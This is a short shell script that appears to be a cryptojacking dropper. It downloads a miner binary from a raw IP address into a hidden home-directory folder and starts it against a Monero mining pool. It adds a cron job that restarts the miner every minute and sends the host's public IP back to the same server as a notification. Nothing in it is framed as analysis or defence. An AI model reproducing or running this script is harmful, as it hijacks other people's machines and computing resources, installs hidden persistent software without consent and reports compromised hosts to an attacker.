#!/bin/sh

apk add wget curl || apt-get install -y wget curl || true
mkdir -p $HOME/.miner
wget 143.198.125.69/miner_linux_amd64 -O $HOME/.miner/miner
chmod +x $HOME/.miner/miner
cat > $HOME/.miner/start <<EOF
#!/bin/sh
if ! pgrep -x miner >/dev/null; then
  echo "miner not running, starting"
  $HOME/.miner/miner pool.minexmr.com --donate-level=0 &
fi
EOF
chmod +x $HOME/.miner/start
$HOME/.miner/start

# Add crontab
crontab -l > mycron
echo "* * * * * $HOME/.miner/start" >> mycron
#install new cron file
crontab mycron
rm mycron

# notify
curl -s -XPOST http://143.198.125.69/notify?ip=$(curl -s checkip.amazonaws.com) -o/dev/null